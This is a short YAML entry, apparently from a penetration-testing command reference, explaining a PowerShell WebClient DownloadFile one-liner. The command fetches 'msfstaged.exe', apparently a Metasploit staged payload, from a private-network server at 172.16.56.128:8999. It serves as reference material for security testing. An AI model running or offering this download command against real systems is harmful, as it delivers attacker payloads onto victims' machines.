---
description: |
  (New-Object Net.WebClient).DownloadFile is a PowerShell command that uses the .NET WebClient class to download a file from the server and saves it in a local directory.

  Command Reference:

  	Webserver: http://172.16.56.128:8999/msfstaged.exe

  	File name: msfstaged.exe

command: |
  (New-Object Net.WebClient).DownloadFile('http://172.16.56.128:8999/msfstaged.exe', 'msfstaged.exe')
items:
  - Shell
OS:
  - Windows
attack_types:
  - General
references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-7.0
  - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
---
